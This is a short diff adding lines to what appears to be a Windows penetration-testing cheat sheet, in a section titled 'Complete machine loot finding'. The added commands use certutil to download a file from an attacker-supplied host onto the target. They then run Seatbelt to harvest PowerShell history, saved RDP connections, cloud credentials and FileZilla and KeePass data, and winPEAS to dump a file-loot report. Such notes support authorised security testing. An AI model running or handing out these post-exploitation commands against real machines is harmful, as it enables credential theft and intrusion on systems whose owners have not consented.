@@ -10,7 +10,10 @@ export localadminpwd=<LOCALADMINPASSWORD>
 
 ### Complete machine loot finding
 ```bash
+certutil.exe -urlcache -split -f "http://<YOUR_IP>/filename.ext" "C:\Windows\Temp\filename.ext"
 
+Seatbelt.exe PowerShellHistory SavedRdpConnections CloudCredentials FileZilla KeePass
+winPEASany.exe filesinfo > C:\Windows\Temp\files_loot.txt
 ```
 
 ### Dump cached pwds and logonpwds
